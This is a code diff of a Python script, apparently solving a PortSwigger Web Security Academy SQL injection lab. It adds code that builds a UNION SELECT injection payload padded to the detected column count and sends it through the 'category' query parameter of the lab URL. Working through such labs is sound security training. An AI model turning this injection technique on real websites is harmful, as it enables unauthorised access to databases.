@@ -1,11 +1,8 @@
-from typing import Union
-from urllib.parse import quote, quote_plus
+from urllib.parse import quote
 
 import requests as r
 import urllib3
-from bs4 import BeautifulSoup
 from rich.console import Console
-from rich.panel import Panel
 from rich.traceback import install
 
 install()
@@ -42,8 +39,21 @@ def get_col_nums(URL, max_col=10):
 
 
 def main() -> None:
-    URL = "https://0a6900a40386088c8178ac84005a0081.web-security-academy.net/filter?category=Pets"
-    print(get_col_nums(URL))
+    URL = "https://0a7d0062039a22a680c20d8f000f00d0.web-security-academy.net/filter?category=Pets"
+
+    PAYLOAD = (
+        "' UNION SELECT "
+        + ", ".join(
+            (cols := ["NULL", "'uVRY0h'"])
+            + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
+        ).strip(", ")
+        + "--"
+    )
+    print(PAYLOAD)
+
+    response: r.Response = r.get(URL + quote(PAYLOAD))
+    print(response.text)
+    print(response.status_code)
 
 
 if __name__ == "__main__":
